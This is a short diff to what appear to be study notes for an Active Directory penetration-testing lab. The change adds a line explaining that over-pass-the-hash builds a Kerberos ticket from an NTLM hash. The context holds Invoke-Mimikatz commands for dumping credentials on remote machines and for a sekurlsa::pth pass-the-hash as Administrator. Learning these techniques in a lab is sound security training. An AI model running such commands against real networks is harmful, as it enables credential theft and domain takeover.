@@ -352,7 +352,8 @@ println "out> $sout err> $err"
 - Dump credentials on multiple remote machines
   - `Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")`
 - Invoke-Mimikatz uses PowerShell remoting cmdlet `Invoke-Command` to do above.
-- "Over pass the hash" generate tokens from hashes.
+- "Over pass the hash" generate tokens from hashes. (Write the hashes)
+  - Over pass the hash creates a valid kerberos ticket of using NTLM hash of a user.
   - `Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntlmhash> /run:powershell.exe"'`
   
 ## Domain Persistence Part 1
